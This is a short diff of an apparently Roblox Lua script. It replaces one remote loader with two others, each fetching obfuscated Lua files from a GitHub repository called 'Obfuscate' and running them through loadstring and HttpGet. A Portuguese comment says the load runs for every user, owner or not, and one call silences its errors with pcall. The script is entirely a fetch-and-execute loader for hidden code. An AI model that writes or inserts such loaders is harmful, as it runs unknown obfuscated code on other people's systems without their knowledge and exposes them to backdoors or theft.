@@ -1,1 +1,7 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/darkDev667/Obfuscate/refs/heads/main/obfuscated_script-1769362531289.lua.txt", true))()
+--// Executa o load para TODOS (independente se é dono ou não)
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/darkDev667/Obfuscate/refs/heads/main/92991025edd0c864.lua"))()
+end)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/darkDev667/Obfuscate/refs/heads/main/78bdbf8e1248d84c.lua"))()
